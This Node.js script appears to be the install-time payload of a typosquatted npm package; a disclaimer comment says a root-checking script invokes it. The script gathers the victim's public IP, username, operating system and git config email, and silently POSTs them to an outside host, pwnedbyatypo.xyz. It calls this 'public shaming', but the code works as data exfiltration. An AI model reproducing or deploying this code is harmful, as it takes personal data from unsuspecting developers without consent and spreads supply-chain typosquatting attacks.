#! /usr/bin/env node
'use strict';

/*
 * DISCLAIMER: If you are reading this, know that it is invoked from another script that first checks for root access.
 * So you know that it could be doing a lot worse, but it is not; all this script does is get your public IP, username,
 * OS, and your email in your .gitconfig file. It then uploads that data to http://pwnedbyatypo.xyz to publicly shame you
 * for running unknown code as root. 
 */ 

const async = require('async');
const chalk = require('chalk');
const gitconfig = require('git-config');
const isRoot = require('is-root');
const network = require('network');
const os = require('node.os');
const request = require('request');
const shell = require('shelljs');
const username = require('username');

let operations = [];
operations.push(getPublicIp);
operations.push(getUsername);
operations.push(getOs);
operations.push(getEmail);

async.series(operations, function(err, results) {
    if (err) {
        return err;
    } else {
        // silent HTTP Post to pwnedbyatypo.xyz
        let pwnedObj = {
            'ip': results[0],
            'username': results[1],
            'platform': results[2],
            'email': results[3]
        };
        request.post({
            url: 'http://pwnedbyatypo.xyz/pwned',
            form: pwnedObj
        }, function(err, response, body) {
            if (err) {
                return err;
            }            
        });        
    }
});


//get public IP
function getPublicIp(callback) {
    network.get_public_ip(function(err, ip) {
        if (err) {
            return callback(err);
        } else {
            callback(null, ip);
        }
    });
};

//get username
function getUsername(callback) {
    username().then(function(username) {
        callback(null, username);
    });
};

//get OS
function getOs(callback) {
    let platform = os.os;
    callback(null, platform);
};

//get email from gitconfig
function getEmail(callback) {
    gitconfig(function (err, config) {
        if (err) {
            return callback(err);
        }
        callback(null, config.user.email);
    });
};
